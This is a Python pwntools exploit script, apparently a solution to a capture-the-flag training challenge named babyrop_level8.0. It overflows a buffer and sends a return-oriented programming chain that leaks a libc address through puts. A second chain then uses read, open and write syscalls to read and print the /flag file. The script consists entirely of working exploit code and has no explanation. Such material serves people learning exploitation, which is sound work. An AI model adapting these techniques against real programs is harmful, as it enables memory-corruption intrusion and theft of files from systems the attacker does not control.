from pwn import *

r = process('/challenge/babyrop_level8.0')

# r.recvuntil(b'is: ')
# libc = int(r.recv(14),16) - 0x55410
# print(hex(libc))

pop_rdi = 0x401fe3

buffer = 0x405000
ret = 0x401d3e
puts = 0x401110
puts_got = 0x405028

payload = b'\x00' * 0x28
payload += p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(ret)
r.send(payload)

r.recvuntil(b'Leaving!\n')
libc = u64(r.recv(6)+b'\x00\x00') - 0x875a0
print(hex(libc))

pop_rsi = libc + 0x27529
pop_rdx_r12 = libc + 0x11c371
pop_rax = libc + 0x4a550
syscall = libc + 0x66229

payload = b'\x00' * 0x28
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x10) + p64(0) + p64(syscall) ## write /flag to 0x404000
payload += p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(buffer)+ p64(pop_rsi) + p64(0) + p64(pop_rdx_r12) + p64(0) + p64(0) + p64(syscall) #open 
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x40) + p64(0)  + p64(syscall) #read 
payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x40) + p64(0)  + p64(syscall) #write
r.send(payload)
r.send(b'/flag')


r.interactive()